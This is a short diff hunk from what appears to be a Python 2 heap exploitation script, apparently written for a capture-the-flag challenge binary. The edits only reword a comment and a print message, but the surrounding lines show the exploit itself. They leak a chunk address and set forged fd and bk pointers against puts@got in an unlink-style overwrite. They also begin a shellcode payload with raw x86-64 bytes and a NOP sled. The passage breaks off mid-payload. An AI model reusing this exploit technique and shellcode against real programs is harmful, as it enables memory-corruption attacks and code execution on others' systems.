@@ -300,11 +300,11 @@ write('0','A'*71)
 
 leak = u32(print_all().split('\n')[1])
 
-print "[*] 3rd chunk leaked :", hex(leak)
+print "[*] &chunk_3 leaked :", hex(leak)
 
 puts = 0x609958 # puts@got
 fd = puts - 0x18
-bk = leak + 0x90 # chunk_5's data addr
+bk = leak + 0x90 # 5th data addr
 
 payload  = "\x48\x31\xF6\xeb\x13"# xor rsi, rsi; jmp 0x18;
 payload += "\x90" * 24
